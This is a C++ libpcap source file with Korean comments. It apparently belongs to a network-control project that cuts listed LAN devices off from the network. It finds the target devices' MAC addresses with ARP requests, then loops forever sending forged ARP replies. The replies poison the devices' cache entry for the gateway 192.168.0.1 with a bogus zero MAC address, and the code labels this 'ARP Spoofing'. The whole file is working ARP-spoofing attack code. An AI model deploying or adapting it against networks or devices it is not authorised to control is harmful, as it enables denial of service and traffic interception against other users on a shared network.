#include "network.h"
//control할 ip에 해당하는 mac주소 얻어오는 작업
extern VECTOR control_ip;   //네트워크 제한 받을 것
extern VECTOR control_vector;   //arp 보내야할 목록
extern MAP control_mac;

int getMy_IP(char *my_ip)
{
    int sock;
    struct ifreq ifr;

    sock = socket(AF_PACKET, SOCK_DGRAM, 0);
    if (sock < 0){
        perror("socket");
        close(sock);
        return -1;
    }
    printf("socket good\n");
    strcpy(ifr.ifr_name, "enp0s3");
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0){
        perror("ioctl() - get ip");
        close(sock);
        return -1;
    }
    struct sockaddr_in *addr;
    addr =(struct sockaddr_in*)&ifr.ifr_addr;
    memcpy(my_ip, inet_ntoa(addr-> sin_addr), sizeof(ifr.ifr_addr));
    close(sock);
    return 1;

}

void forMAC_ARPreq(pcap_t* handle){
    printf("send arp request for to get mac address\n");
    char my_ip[20];
    uint8_t me_mac[6];
    VECTOR::iterator iter;

    getMacAddress(me_mac);      //내 mac얻어오기
    getMy_IP(my_ip);            //내 ip얻어오기
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ =Mac(me_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(me_mac);
    packet.arp_.sip_ = htonl(Ip(my_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");

    for(iter=control_ip.begin(); iter!=control_ip.end(); iter++){
        //제어할 디바이스의 mac주소 위해 (arp request 보내기)
        uint32_t arp_tip = *iter;
        packet.arp_.tip_ = htonl(arp_tip);
        EthArpPacket reply_packet;

        //arp request 날림
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0)
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int getMacAddress(uint8_t *mac)
{
    int sock;
    struct ifreq ifr;

    sock = socket(AF_PACKET, SOCK_DGRAM, 0);
    if (sock < 0){
        perror("socket");
        close(sock);
        return -1;
    }
    printf("socket good\n");
    strcpy(ifr.ifr_name, "enp0s3");
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0)
    {
        perror("ioctl() - get mac");
        close(sock);
        return -1;
    }
    printf("before mm\n");
    memcpy(mac, ifr.ifr_hwaddr.sa_data,6);
    printf("before okm\n");

    close(sock);
    return 1;
}


/*
    제어할 ip에 값이 있으면 send arp 조지깅
*/
void sendARP(pcap_t* handle){
//스레드로 돌려야함
    VECTOR::iterator iter;
    EthArpPacket Spoofing_packet;
    uint8_t me_mac[6];
    getMacAddress(me_mac);      //내 mac얻어오기

    Spoofing_packet.eth_.type_ = htons(EthHdr::Arp);

    Spoofing_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    Spoofing_packet.arp_.pro_ = htons(EthHdr::Ip4);
    Spoofing_packet.arp_.hln_ = Mac::SIZE;
    Spoofing_packet.arp_.pln_ = Ip::SIZE;
    Spoofing_packet.arp_.op_ = htons(ArpHdr::Reply);

    Spoofing_packet.eth_.smac_ = Mac(me_mac);
    Spoofing_packet.arp_.smac_ = Mac("00:00:00:00:00:00");  //일부로 이상한 값 넣어서 라파에 패킷이 안오도록한다.
    Spoofing_packet.arp_.tip_ = htonl(Ip("192.168.0.1"));

    while(ARPcontroler){
        if(control_vector.empty()){
            sleep(1);
        }
        
        for(iter=control_vector.begin(); iter!=control_vector.end(); iter++){
            Mac tm = control_mac[Ip(*iter)];
            Spoofing_packet.eth_.dmac_ = tm;
            Spoofing_packet.arp_.sip_ = htonl(*iter);
            Spoofing_packet.arp_.tmac_ = tm;

            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Spoofing_packet), sizeof(EthArpPacket));
            if (res != 0) 
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            printf("ARP Spoofing ~\n ");
        }
        std::this_thread::sleep_for(std::chrono::seconds(3));
        
    }
}